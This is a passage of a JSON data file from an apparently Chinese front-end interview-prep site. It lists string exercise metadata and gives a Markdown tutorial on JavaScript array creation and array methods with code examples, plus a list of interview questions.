    "exerciseKeyList": "[\"f5dbd066-d3dd-4b92-9305-8ec83c387cde\",\"97758079-03f4-40ce-9b71-8c3c4e5db338\",\"6ddaaa89-e126-4d68-b71d-8a13c2df7315\",\"0003100e-5f40-499e-9e00-8bbbc5e90976\",\"f2732eb3-de42-47be-949e-35219071fdc4\",\"53de0582-783d-490b-b7ca-7a20e9d13cb8\",\"8f4296bd-3a36-47d4-a13b-05b5b628c37e\",\"94c6d4eb-76c3-4756-956e-9cc277d9d93f\",\"e797a169-0044-43d1-8fe6-4bad6e7372f9\",\"b9df09ce-3064-4ac0-bb66-3eb522679a4b\",\"7375c380-9dd8-497e-9b74-e4cc0779532c\",\"d2396e88-33d5-4374-ba81-b41609a57289\",\"39513146-d7a4-41ad-963f-ba32242ddc55\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 20,
    "createAt": "2024-11-08T14:35:44.000Z",
    "updateAt": "2024-11-08T14:41:39.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0003100e-5f40-499e-9e00-8bbbc5e90976",
        "title": "去除字符串中出现次数最少的字符，不改变原字符串的顺序。",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:20:39.000Z",
        "updateAt": "2024-07-22T11:39:49.000Z"
      },
      {
        "exerciseKey": "39513146-d7a4-41ad-963f-ba32242ddc55",
        "title": "Javascript字符串的常用方法有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:45:44.000Z",
        "updateAt": "2024-07-20T18:39:29.000Z"
      },
      {
        "exerciseKey": "53de0582-783d-490b-b7ca-7a20e9d13cb8",
        "title": "如何判断某个字符串长度（要求支持表情）？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:30.000Z",
        "updateAt": "2024-08-10T17:07:03.000Z"
      },
      {
        "exerciseKey": "6ddaaa89-e126-4d68-b71d-8a13c2df7315",
        "title": "两个字符串对比, 得出结论都做了什么操作, 比如插入或者删除",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:39:28.000Z",
        "updateAt": "2023-05-23T09:20:32.000Z"
      },
      {
        "exerciseKey": "7375c380-9dd8-497e-9b74-e4cc0779532c",
        "title": "字符串解析问题\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:13:03.000Z",
        "updateAt": "2021-07-07T00:13:47.000Z"
      },
      {
        "exerciseKey": "8f4296bd-3a36-47d4-a13b-05b5b628c37e",
        "title": "使用正则表达式实现以下需求：筛选出数组中只包含大小写字母的字符串，并将结果转换成大写\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:18.000Z",
        "updateAt": "2023-04-23T20:15:09.000Z"
      },
      {
        "exerciseKey": "94c6d4eb-76c3-4756-956e-9cc277d9d93f",
        "title": "字符串相加",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-11T14:46:04.000Z",
        "updateAt": "2024-01-24T17:25:19.000Z"
      },
      {
        "exerciseKey": "97758079-03f4-40ce-9b71-8c3c4e5db338",
        "title": "两个字符串的删除操作",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-23T01:24:45.000Z",
        "updateAt": "2023-05-23T09:24:59.000Z"
      },
      {
        "exerciseKey": "b9df09ce-3064-4ac0-bb66-3eb522679a4b",
        "title": "实现一个方法，清除字符串前后的空格。",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T16:08:54.000Z",
        "updateAt": "2025-07-16T11:48:58.000Z"
      },
      {
        "exerciseKey": "d2396e88-33d5-4374-ba81-b41609a57289",
        "title": "实现一个函数，判断输入是不是回文字符串。",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:02:30.000Z",
        "updateAt": "2021-07-07T00:12:31.000Z"
      },
      {
        "exerciseKey": "e797a169-0044-43d1-8fe6-4bad6e7372f9",
        "title": "写一个 repeat 方法，实现字符串的复制拼接",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-27T10:02:58.000Z",
        "updateAt": "2024-07-20T11:10:15.000Z"
      },
      {
        "exerciseKey": "f2732eb3-de42-47be-949e-35219071fdc4",
        "title": "如何定义一个数组，它的元素可能是字符串类型，也可能是数值类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-03-12T15:05:52.000Z",
        "updateAt": "2023-03-12T23:11:18.000Z"
      },
      {
        "exerciseKey": "f5dbd066-d3dd-4b92-9305-8ec83c387cde",
        "title": "利用字符重复出现的次数，编写一种方法，实现基本的字符串压缩功能。比如，字符串aabcccccaaa会变为a2b1c5a3",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-08-20T13:22:42.000Z",
        "updateAt": "2024-03-12T21:45:00.000Z"
      }
    ]
  },
  "159": {
    "id": 159,
    "tagId": 10,
    "title": "数组常用方法",
    "explanation": "数组是 js 中最常用到的数据集合，其内置的方法有很多，熟练掌握这些方法，可以有效的提高我们的工作效率，同时对我们的代码质量也是有很大影响。\n\n# 一、创建数组\n\n## 1.使用数组字面量表示法\n\n```js\nvar arr4 = [];   //创建一个空数组\nvar arr5 = [20];   // 创建一个包含1项数据为20的数组\nvar arr6 = [\"lily\",\"lucy\",\"Tom\"];   // 创建一个包含3个字符串的数组\n```\n\n## 2.使用 Array 构造函数\n\n### 无参构造\n\n```js\nvar arr1 = new Array();   //创建一个空数组\n```\n\n### 带参构造\n\n如果只传一个数值参数，则表示创建一个初始长度为指定数值的空数组\n\n```js\nvar arr2 = new Array(20);   // 创建一个包含20项的数组\n```\n\n如果传入一个非数值的参数或者参数个数大于 1，则表示创建一个包含指定元素的数组\n\n```js\nvar arr3 = new Array(\"lily\",\"lucy\",\"Tom\");   // 创建一个包含3个字符串的数组\nvar array4 = new Array('23'); // [\"23\"]\n```\n\n## 3.Array.of 方法创建数组(es6 新增)\n\nES6 为数组新增创建方法的目的之一，是帮助开发者在使用 Array 构造器时避开 js 语言的一个怪异点。\n\n**Array.of()方法总会创建一个包含所有传入参数的数组，而不管参数的数量与类型。**\n\n```js\nlet arr = Array.of(1, 2);\nconsole.log(arr.length);//2\n\nlet arr1 = Array.of(3);\nconsole.log(arr1.length);//1\nconsole.log(arr1[0]);//3\n\nlet arr2 = Array.of('2');\nconsole.log(arr2.length);//1\nconsole.log(arr2[0]);//'2'\n```\n\n## 4.Array.from 方法创建数组(es6 新增)\n\n在 js 中将**非数组对象转换为真正的数组**是非常麻烦的。在 ES6 中，将可迭代对象或者类数组对象作为第一个参数传入，Array.from()就能返回一个数组。\n\n```js\nfunction arga(...args) {  //...args剩余参数数组,由传递给函数的实际参数提供\n    let arg = Array.from(args);\n    console.log(arg);\n}\n\narga('arr1', 26, 'from'); // ['arr1',26,'from']\n```\n\n### 映射转换\n\n如果你想实行进一步的数组转换，你可以向 Array.from()方法传递一个映射用的函数作为第二个参数。此函数会将数组对象的每一个值转换为目标形式，并将其存储在目标数组的对应位置上。\n\n```js\nfunction arga(...args) {  \n     return Array.from(args, value => value + 1);\n}\n\nlet arr = arga('arr', 26, 'pop');\nconsole.log(arr);//['arr1',27,'pop1']\n```\n\n如果映射函数需要在对象上工作，你可以手动传递第三个参数给 Array.from()方法，从而指定映射函数内部的 this 值\n\n```js\nconst helper = {\n  diff: 1,\n  add(value) {\n    return value + this.diff;\n  }\n}\n\nfunction translate() {\n //arguments 是一个对应于传递给函数的参数的类数组对象\n  return Array.from(arguments, helper.add, helper); \n}\n\nlet arr = translate('liu', 26, 'man');\nconsole.log(arr); // [\"liu1\", 27, \"man1\"]\n```\n\n# 二、数组方法\n\n## 数组原型方法主要有以下这些\n\n-   `join()`：用指定的分隔符将数组每一项拼接为字符串\n-   `push()` ：向数组的末尾添加新元素\n-   `pop()`：删除数组的最后一项\n-   `shift()`：删除数组的第一项\n-   `unshift()`：向数组首位添加新元素\n-   `slice()`：按照条件查找出其中的部分元素\n-   `splice()`：对数组进行增删改\n-   `fill()`: 方法能使用特定值填充数组中的一个或多个元素\n-   `filter()`:“过滤”功能\n-   `concat()`：用于连接两个或多个数组\n-   `indexOf()`：检测当前值在数组中第一次出现的位置索引\n-   `lastIndexOf()`：检测当前值在数组中最后一次出现的位置索引\n-   `every()`：判断数组中每一项都是否满足条件\n-   `some()`：判断数组中是否存在满足条件的项\n-   `includes()`：判断一个数组是否包含一个指定的值\n-   `sort()`：对数组的元素进行排序\n-   `reverse()`：对数组进行倒序\n-   `forEach()`：ES5 及以下循环遍历数组每一项\n-   `map()`：ES6 循环遍历数组每一项\n-   `copyWithin()`:用于从数组的指定位置拷贝元素到数组的另一个指定位置中\n-   `find()`:返回匹配的值\n-   `findIndex()`:返回匹配位置的索引\n-   `toLocaleString()、toString()`:将数组转换为字符串\n-   `flat()、flatMap()`：扁平化数组\n-   `entries() 、keys() 、values()`:遍历数组\n\n## 各个方法的基本功能详解\n\n### 1.join()\n\n`join()`方法用于把数组中的所有元素转换一个字符串。\n\n元素是通过指定的分隔符进行分隔的。默认使用逗号作为分隔符\n\n```js\nvar arr = [1,2,3];\nconsole.log(arr.join());   // 1,2,3\nconsole.log(arr.join(\"-\"));   // 1-2-3\nconsole.log(arr);   // [1, 2, 3]（原数组不变）\n```\n\n通过**join()方法可以实现重复字符串**，只需传入字符串以及重复的次数，就能返回重复后的字符串，函数如下：\n\n```js\nfunction repeatString(str, n) {\n//一个长度为n+1的空数组用string去拼接成字符串,就成了n个string的重复\n\treturn new Array(n + 1).join(str);\n}\nconsole.log(repeatString(\"abc\", 3));   // abcabcabc\nconsole.log(repeatString(\"Hi\", 5));   // HiHiHiHiHi\n```\n\n### 2.push()和 pop()\n\n`push()` 方法**从数组末尾向数组添加元素**，可以添加一个或多个元素。\n\n`pop()` 方法用于**删除数组的最后一个元素**并返回删除的元素。\n\n```js\nvar arr = [\"Lily\",\"lucy\",\"Tom\"];\nvar count = arr.push(\"Jack\",\"Sean\");\nconsole.log(count);  // 5\nconsole.log(arr);   // [\"Lily\", \"lucy\", \"Tom\", \"Jack\", \"Sean\"]\nvar item = arr.pop();\nconsole.log(item);   // Sean\nconsole.log(arr);   // [\"Lily\", \"lucy\", \"Tom\", \"Jack\"]\n```\n\n### 3.shift() 和 unshift()\n\n`shift()` 方法用于**把数组的第一个元素从其中删除**，并返回第一个元素的值。\n\n`unshift()` 方法可**向数组的开头添加一个或更多元素**，并返回新的长度。\n\n```js\nvar arr = [\"Lily\",\"lucy\",\"Tom\"];\nvar count = arr.unshift(\"Jack\",\"Sean\");\nconsole.log(count);   // 5\nconsole.log(arr);   //[\"Jack\", \"Sean\", \"Lily\", \"lucy\", \"Tom\"]\nvar item = arr.shift();\nconsole.log(item);   // Jack\nconsole.log(arr);   // [\"Sean\", \"Lily\", \"lucy\", \"Tom\"]\n```\n\n### 4.sort()\n\nsort() 方法用于对数组的元素进行排序。\n\n排序顺序可以是字母或数字，并按升序或降序。\n\n默认排序顺序为按字母升序。\n\n```js\nvar arr1 = [\"a\", \"d\", \"c\", \"b\"];\nconsole.log(arr1.sort());   // [\"a\", \"b\", \"c\", \"d\"]\narr2 = [13, 24, 51, 3];\nconsole.log(arr2.sort());   // [13, 24, 3, 51]\nconsole.log(arr2);   // [13, 24, 3, 51](元数组被改变)\n```\n\n为了解决上述问题，sort()方法可以接收一个比较函数作为参数，以便我们指定哪个值位于哪个值的前面。\n\n比较函数接收两个参数，如果第一个参数应该位于第二个之前则返回一个负数，如果两个参数相等则返回 0，如果第一个参数应该位于第二个之后则返回一个正数。以下就是一个简单的比较函数：\n\n```js\nfunction compare(value1, value2) {\n    if (value1 < value2) {\n    \treturn -1;\n    } else if (value1 > value2) {\n   \t\treturn 1;\n    } else {\n    \treturn 0;\n    }\n}\narr2 = [13, 24, 51, 3];\nconsole.log(arr2.sort(compare));   // [3, 13, 24, 51]\n```\n\n如果需要通过比较函数产生降序排序的结果，只要交换比较函数返回的值即可：\n\n```js\nfunction compare(value1, value2) {\n    if (value1 < value2) {\n    \treturn 1;\n    } else if (value1 > value2) {\n    \treturn -1;\n    } else {\n    \treturn 0;\n    }\n}\narr2 = [13, 24, 51, 3];\nconsole.log(arr2.sort(compare));   // [51, 24, 13, 3]\n```\n\n### 5.reverse()\n\nreverse() 方法用于颠倒数组中元素的顺序。\n\n```js\nvar arr = [13, 24, 51, 3];\nconsole.log(arr.reverse());   //[3, 51, 24, 13]\nconsole.log(arr);   //[3, 51, 24, 13](原数组改变)\n```\n\n### 6.concat()\n\nconcat() 方法用于连接两个或多个数组。\n\n该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。\n\n```js\nvar arr = [1,3,5,7];\nvar arrCopy = arr.concat(9,[11,13]);\nconsole.log(arrCopy);   //[1, 3, 5, 7, 9, 11, 13]\nconsole.log(arr);   // [1, 3, 5, 7](原数组未被修改)\n```\n\n从上面测试结果可以发现：传入的不是数组，则直接把参数添加到数组后面，如果传入的是数组，则将数组中的各个项添加到数组中。但是如果传入的是一个二维数组呢？\n\n```js\nvar arrCopy2 = arr.concat([9,[11,13]]);\nconsole.log(arrCopy2);   //[1, 3, 5, 7, 9, Array[2]]\nconsole.log(arrCopy2[5]);   //[11, 13]\n```\n\n### 7.slice()\n\nslice()：返回从原数组中指定开始下标到结束下标之间的项组成的新数组。\n\nslice()方法可以接受一或两个参数，即要返回项的起始和结束位置。\n\n在**只有一个参数**的情况下， slice()方法返回从该参数指定位置开始到当前数组末尾的所有项。\n\n如果**有两个参数**，该方法返回起始和结束位置之间的项，但不包括结束位置的项。\n\n**当出现负数时，将负数加上数组长度的值（6）来替换该位置的数**\n\n```js\nvar arr = [1,3,5,7,9,11];\nvar arrCopy = arr.slice(1);\nvar arrCopy2 = arr.slice(1,4);\nvar arrCopy3 = arr.slice(1,-2);//相当于arr.slice(1,4)\nvar arrCopy4 = arr.slice(-4,-1);//相当于arr.slice(2,5)\nconsole.log(arr);   //[1, 3, 5, 7, 9, 11](原数组没变)\nconsole.log(arrCopy);   //[3, 5, 7, 9, 11]\nconsole.log(arrCopy2);   //[3, 5, 7]\nconsole.log(arrCopy3);   //[3, 5, 7]\nconsole.log(arrCopy4);   //[5, 7, 9]\n```\n\n### 8.splice()\n\n`splice()`：很强大的数组方法，它有很多种用法，可以**实现删除、插入和替换**。\n\n#### 1.删除元素,并返回删除的元素\n\n可以删除任意数量的项，只需指定 2 个参数：要删除的第一项的位置和要删除的项数。例如， splice(0,2)会删除数组中的前两项。\n\n```js\nvar arr = [1,3,5,7,9,11];\nvar arrRemoved = arr.splice(0,2);\nconsole.log(arr);   //[5, 7, 9, 11]\nconsole.log(arrRemoved);   //[1, 3]\n```\n\n#### 2.向指定索引处添加元素\n\n可以向指定位置插入任意数量的项，只需提供 3 个参数：起始位置、 0（要删除的项数）和要插入的项。例如，splice(2,0,4,6)会从当前数组的位置 2 开始插入 4 和 6。\n\n```js\nvar array1 = [22, 3, 31, 12];\narray1.splice(1, 0, 12, 35);  //[]\n\nconsole.log(array1); // [22, 12, 35, 3, 31, 12]\n\n```\n\n#### 3.替换指定索引位置的元素\n\n可以向指定位置插入任意数量的项，且同时删除任意数量的项，只需指定 3 个参数：起始位置、要删除的项数和要插入的任意数量的项。插入的项数不必与删除的项数相等。例如，splice (2,1,4,6)会删除当前数组位置 2 的项，然后再从位置 2 开始插入 4 和 6。\n\n```js\nconst array1 = [22, 3, 31, 12];\narray1.splice(1, 1, 8);   //[3]\n\nconsole.log(array1);  // [22, 8, 31, 12]\n```\n\n### 9.indexOf()和 lastIndexOf()\n\n**接收两个参数**：要查找的项和（可选的）表示查找起点位置的索引。\n\n`indexOf()`： 从数组的开头（位置 0）开始向后查找。\n\n`lastIndexOf`： 从数组的末尾开始向前查找。\n\n这两个方法都返回要查找的项在数组中的位置，或者在**没找到的情况下返回-1**。在比较第一个参数与数组中的每一项时，会**使用全等操作符**。\n\n```js\nvar arr = [1,3,5,7,7,5,3,1];\nconsole.log(arr.indexOf(5));   //2\nconsole.log(arr.lastIndexOf(5));   //5\nconsole.log(arr.indexOf(5,2));   //2\nconsole.log(arr.lastIndexOf(5,4));   //2\nconsole.log(arr.indexOf(\"5\"));   //-1\n```\n\n### 10.forEach()\n\nforEach()：对数组进行遍历循环，对数组中的每一项运行给定函数。这个方法没有返回值。参数都是 function 类型，默认有传，。\n\n**参数分别为**：遍历的数组内容；第对应的数组索引，数组本身\n\n```js\nvar arr = [11, 22, 33, 44, 55];\narr.forEach(function(x, index, a){\n\tconsole.log(x + '|' + index + '|' + (a === arr));\n});\n\n输出为：\n\n 11|0|true\n 22|1|true\n 33|2|true\n 44|3|true\n 55|4|true\n```\n\n### 11.map()\n\n`map()` 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。\n\n`map()` 方法按照原始数组元素顺序依次处理元素。\n\n该方法不会改变原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5];\nvar arr2 = arr.map(function(item){\n\treturn item*item;\n});\nconsole.log(arr2);  //[1, 4, 9, 16, 25]\n```\n\n### 12.filter()\n\nfilter()：“过滤”功能，数组中的每一项运行给定函数，返回满足过滤条件组成的数组。\n\n```js\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nvar arr2 = arr.filter(function(x, index) {\n\treturn index % 3 === 0 || x >= 8;\n});\nconsole.log(arr2);  //[1, 4, 7, 8, 9, 10]\n```\n\n### 13.fill() es6 新增\n\nfill()方法能使用特定值填充数组中的一个或多个元素。当只是用一个参数时，该方法会用该参数的值填充整个数组。\n\n```js\nlet arr = [1, 2, 3, 'cc', 5];\narr.fill(1);\nconsole.log(arr);//[1,1,1,1,1];\n```\n\n如果不想改变数组中的所有元素，而只是想改变其中一部分，那么可以使用可选的起始位置参数与结束位置参数（不包括结束位置的那个元素）\n\n**3 个参数：** 填充数值，起始位置参数，结束位置参数（不包括结束位置的那个元素）\n\n```js\nlet arr = [1, 2, 3, 'arr', 5];\n\narr.fill(1, 2);\nconsole.log(arr);//[1,2,1,1,1]\n\narr.fill(0, 1, 3);\nconsole.log(arr);//[1,0,0,1,1];\n```\n\n### 14.every()\n\nevery()：判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回 true。\n\n```js\nvar arr = [1, 2, 3, 4, 5];\nvar arr2 = arr.every(function(x) {\n\treturn x < 10;\n});\nconsole.log(arr2);  //true\nvar arr3 = arr.every(function(x) {\n\treturn x < 3;\n});\nconsole.log(arr3);  // false\n```\n\n### 15.some()\n\nsome()：判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回 true。\n\n```js\nvar arr = [1, 2, 3, 4, 5];\nvar arr2 = arr.some(function(x) {\n\treturn x < 3;\n});\nconsole.log(arr2);  //true\nvar arr3 = arr.some(function(x) {\n\treturn x < 1;\n});\nconsole.log(arr3);  // false\n```\n\n### 16.includes() es7 新增\n\nincludes() 方法用来判断一个数组是否包含一个指定的值，如果是返回 true，否则 false。\n\n**参数有两个**，其中第一个是（必填）需要查找的元素值，第二个是（可选）开始查找元素的位置\n\n```js\nconst array1 = [22, 3, 31, 12, 'arr'];\nconst includes = array1.includes(31);\nconsole.log(includes); // true\n\nconst includes1 = array1.includes(31, 3); // 从索引3开始查找31是否存在\nconsole.log(includes1); // false\n```\n\n需要注意的是：includes**使用===运算符**来进行值比较，仅有一个例外：**NaN 被认为与自身相等**。\n\n```js\nlet values = [1, NaN, 2];\nconsole.log(values.indexOf(NaN));//-1\nconsole.log(values.includes(NaN));//true\n```\n\n### 17.reduce()和 reduceRight()\n\n这两个方法都会实现迭代数组的所有项(即累加器)，然后构建一个最终返回的值。\n\n`reduce()`方法从数组的第一项开始，逐个遍历到最后。\n\n`reduceRight()`则从数组的最后一项开始，向前遍历到第一项。\n\n**4 个参数**：前一个值、当前值、项的索引和数组对象\n\n```js\nvar values = [1,2,3,4,5];\nvar sum = values.reduceRight(function(prev, cur, index, array){\nreturn prev + cur;\n},10);   //数组一开始加了一个初始值10,可以不设默认0\nconsole.log(sum);  //25\n```\n\n### 18.toLocaleString() 和 toString()\n\n将数组转换为字符串\n\n```js\nconst array1 = [22, 3, 31, 12];\nconst str = array1.toLocaleString();\nconst str1 = array1.toString();\n\nconsole.log(str); // 22,3,31,12\nconsole.log(str1); // 22,3,31,12\n```\n\n### 19\\. find()和 findIndex()\n\nfind()与 findIndex()方法均接受两个参数：一个回调函数，一个可选值用于指定回调函数内部的 this。\n\n该回调函数可接受三个参数：数组的某个元素，该元素对应的索引位置，以及该数组本身。\n\n该回调函数应当在给定的元素满足你定义的条件时返回 true，而 find()和 findIndex()方法均会在回调函数**第一次返回 true 时停止查找**。\n\n**二者的区别是**：find()方法返回匹配的值，而 findIndex()返回匹配位置的索引。\n\n```js\nlet arr = [1, 2, 3, 'arr', 5, 1, 9];\n\nconsole.log(arr.find((value, keys, arr) => {\n    return value > 2;\n})); // 3 返回匹配的值\n\nconsole.log(arr.findIndex((value, keys, arr) => {\n    return value > 2;\n})); // 2 返回匹配位置的索引\n```\n\n### 20.copyWithin() \\[es6 新增\\]\n\ncopyWithin() 方法用于从数组的指定位置拷贝元素到数组的另一个指定位置中。\n\n该方法会改变现有数组\n\n```js\n//将数组的前两个元素复制到数组的最后两个位置\nlet arr = [1, 2, 3, 'arr', 5];\n\narr.copyWithin(3, 0);\nconsole.log(arr);//[1,2,3,1,2]\n```\n\n默认情况下，copyWithin()方法总是会一直复制到数组末尾，不过你还可以提供一个可选参数来限制到底有多少元素会被覆盖。这第三个参数指定了复制停止的位置（不包含该位置本身）。\n\n```js\nlet arr = [1, 2, 3, 'arr', 5, 9, 17];\n\n//从索引3的位置开始粘贴\n//从索引0的位置开始复制\n//遇到索引3时停止复制\narr.copyWithin(3, 0, 3);\nconsole.log(arr);//[1,2,3,1,2,3,17]\n```\n\n### 21.flat() 和 flatMap() es6 新增\n\nflat() 方法会按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回。\n\n**该方法返回一个新数组，对原数据没有影响。**\n\n**参数：** 指定要提取嵌套数组的结构深度，默认值为 1。\n\n```js\nconst arr1 = [0, 1, 2, [3, 4]];\n\nconsole.log(arr1.flat());\n// expected output: [0, 1, 2, 3, 4]\n\nconst arr2 = [0, 1, 2, [[[3, 4]]]];\n\nconsole.log(arr2.flat(2));\n// expected output: [0, 1, 2, [3, 4]]\n\n//使用 Infinity，可展开任意深度的嵌套数组\nvar arr4 = [1, 2, [3, 4, [5, 6, [7, 8, [9, 10]]]]];\narr4.flat(Infinity);\n// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\n// 扁平化数组空项,如果原数组有空位，flat()方法会跳过空位\nvar arr4 = [1, 2, , 4, 5];\narr4.flat();\n// [1, 2, 4, 5]\n```\n\n`flatMap()`方法对原数组的每个成员执行一个函数，相当于执行Array.prototype.map(),然后**对返回值组成的数组执行flat()方法**。\n\n该方法返回一个新数组，不改变原数组。\n\n```js\n// 相当于 [[2, 4], [3, 6], [4, 8]].flat()\n[2, 3, 4].flatMap((x) => [x, x * 2])\n// [2, 4, 3, 6, 4, 8]\n```\n\n### 22\\. entries(),keys() 和 values() 【ES6】\n\nentries()，keys()和values() —— 用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历\n\n区别是**keys()是对键名的遍历**、**values()是对键值的遍历**，**entries()是对键值对的遍历**\n\n```js\n\nfor (let index of ['a', 'b'].keys()) {  \nconsole.log(index);  \n}  \n// 0  \n// 1  \nfor (let elem of ['a', 'b'].values()) {  \nconsole.log(elem);  \n}  \n// 'a'  \n// 'b'  \nfor (let [index, elem] of ['a', 'b'].entries()) {  \nconsole.log(index, elem);  \n}  \n// 0 \"a\"  \n// 1 \"b\" \n```\n\n如果不使用for...of循环，可以手动调用遍历器对象的**next方法**，进行遍历。\n\n```js\nlet letter = ['a', 'b', 'c'];  \nlet entries = letter.entries();  \nconsole.log(entries.next().value); // [0, 'a']  \nconsole.log(entries.next().value); // [1, 'b']  \nconsole.log(entries.next().value); // [2, 'c'] \n```\n",
    "testPoint": "### 1. **数组基本操作**\n   - 如何创建一个数组？使用字面量创建数组和构造函数有什么区别？\n   - 数组的 `length` 属性是如何工作的？如何修改数组的长度？\n   - 如何访问数组中的元素？如何通过索引获取数组中的元素？\n\n### 2. **遍历数组**\n   - 请列举并简要解释几种常见的遍历数组的方法：`for`、`forEach`、`map`、`filter`、`reduce`、`some`、`every` 等。\n   - `forEach` 和 `map` 的区别是什么？它们在返回值上的区别如何影响使用场景？\n   - 如何使用 `reduce` 方法计算数组的累积值？例如，如何求数组中所有数字的和？\n\n### 3. **数组转换与查找**\n   - `map` 方法的作用是什么？请举例说明如何使用 `map` 来转换数组中的每个元素。\n   - `filter` 方法如何工作？如何使用 `filter` 筛选出数组中符合特定条件的元素？\n   - `find` 和 `findIndex` 的区别是什么？你会如何使用 `find` 来查找数组中的特定元素？\n   - 如何使用 `includes` 检查数组中是否包含某个元素？\n\n### 4. **数组排序与操作**\n   - 如何使用 `sort` 方法对数组进行排序？请解释一下排序时可能遇到的坑，如何对数组按数字或字母顺序排序？\n   - 如何对数组进行反转？请解释 `reverse` 方法的作用。\n   - 如何合并多个数组？可以使用 `concat`、扩展运算符 `...` 等，比较它们的区别和使用场景。\n\n### 5. **数组去重**\n   - 如何去除数组中的重复元素？请举例说明使用 `Set`、`filter` 和 `reduce` 去重的不同方法。\n   - 如何通过 `reduce` 来实现数组去重？举例说明。\n\n### 6. **数组的切割与分段**\n   - 如何使用 `slice` 和 `splice` 方法从数组中提取或删除元素？请解释它们的区别。\n   - 你会如何使用 `slice` 将数组分割成多个部分？\n   - 如何使用 `split` 和 `join` 方法来处理数组与字符串之间的转换？\n\n### 7. **数组的添加与删除**\n   - 如何在数组的开头或末尾添加元素？请使用 `unshift` 和 `push` 举例。\n   - 如何在数组的开头或末尾删除元素？请使用 `shift` 和 `pop` 举例。\n   - 如何使用 `splice` 从数组中删除指定位置的元素？它在删除时是否会改变原数组？\n\n### 8. **数组的合并与拆分**\n   - 如何将两个数组合并成一个新的数组？你会选择使用 `concat` 还是扩展运算符 `...`？\n   - 如何将一个大数组分割成多个小数组？如何实现分页效果？\n\n### 9. **数组与字符串的转换**\n   - 如何将字符串转换为数组？例如，将逗号分隔的字符串转换为数组。\n   - 如何将数组转换为字符串？请举例说明如何使用 `join` 方法合并数组元素。\n   - 如何将一个包含多个数据类型的数组转换为只包含某一数据类型的数组？\n\n### 10. **数组的性能优化**\n   - 当数组长度很大时，`for` 循环与 `forEach` 的性能如何比较？为什么？\n   - 如何优化大数组的遍历操作，避免性能瓶颈？\n\n### 11. **数组与对象的关系**\n   - 数组是如何在内存中存储的？它和普通对象有何不同？\n   - 数组的索引是如何工作的？与普通对象的键值对有什么区别？\n   - 数组中的元素是如何被访问和修改的？\n\n### 12. **数组和栈/队列**\n   - 如何用数组实现栈（LIFO）和队列（FIFO）？请举例说明如何使用 `push`、`pop`、`shift` 和 `unshift` 来模拟这两种数据结构。\n\n### 13. **浅拷贝与深拷贝**\n   - 如何使用 `slice`、`concat`、`spread` 运算符等方法创建数组的浅拷贝？\n   - 如果需要进行深拷贝，如何实现？使用 `JSON.parse()` 和 `JSON.stringify()` 深拷贝的方式有什么局限性？\n   - 如何手动实现深拷贝，尤其是处理嵌套数组和对象时？\n\n### 14. **多维数组的操作**\n   - 如何访问二维数组中的元素？举例说明如何使用嵌套的 `for` 循环遍历二维数组。\n   - 如何将二维数组“拉平”成一维数组？请介绍 `flat` 方法，并举例说明。\n\n### 15. **数组的变化与异步操作**\n   - 如何用数组的异步方法（如 `map` 和 `Promise.all`）处理异步任务，并确保结果按顺序返回？\n   - 如何确保在异步操作中正确地返回数组的操作结果？\n\n### 16. **数组与 ES6 新特性**\n   - 你了解哪些 ES6 引入的新方法来操作数组？比如 `find`, `findIndex`, `includes`, `fill`, `copyWithin` 等。\n   - `Array.from` 和 `Array.of` 方法的区别是什么？请举例说明。\n\n### 17. **数组去重算法与性能**\n   - 请描述如何手动实现去重算法，如何使用 `Set`、`reduce`、`filter` 等方法去重？\n   - 在处理大量数据时，哪种去重方法性能更优？如何评估数组去重方法的性能？\n",
    "exerciseKeyList": "[\"3414a818-1951-4db1-9595-9b16bb06a005\",\"6cbf1c8b-1af1-41e4-a2c1-577021781057\",\"9ba9d7cb-840a-4910-8596-88c6349ead1e\",\"d50af40c-df41-4601-9935-c6aa3c89e3d7\",\"25a1d366-42f6-42e2-9a41-b6dd4624fd55\",\"51b79c37-fdda-46fe-9c79-4f2ac7a09206\",\"30b5a8a5-5420-49cb-94b4-f45684eecba9\",\"068836c3-c6b3-4c4c-b24e-301357cf01c1\",\"746d796e-fd0c-44c7-b38f-00296bdfdde9\",\"62546213-8ab6-473e-8b24-1e53e17ab9fb\",\"a34f9f1b-c1b6-4660-b851-0b610c18e66e\",\"9b464276-64d0-4c3b-b908-0b5e34da878b\",\"37b4752f-88bd-4959-8ff7-c081fdbc20cb\",\"f1502312-3ac7-4089-b306-f64c301b7dd4\",\"a3ff14a6-c938-4cfc-b5a3-57cb201d92d7\",\"f2523d23-7648-47b1-a1b0-f7a01fb92c64\",\"69360791-290f-44c8-ba87-6bfe7a5260ad\",\"b828c477-4689-4a3d-ab51-e41d76bd62e2\",\"8f4296bd-3a36-47d4-a13b-05b5b628c37e\",\"17555ccc-83cf-4f7e-9834-8c1bb749e7d7\",\"c51ba9d2-f3d9-4b38-8f33-f962fa4983ea\",\"f196bf54-110a-4440-896a-a678835bea83\",\"914e2cac-b426-467e-b61c-e0987031ea84\",\"78f23cb3-8ee7-4f02-a995-e74ce3ad3836\",\"e1f26ce6-71ba-4f91-b9a6-42d732799863\",\"cbdbe075-a81e-4c8b-a264-1ffb95a7ee49\",\"e79d1df5-690b-42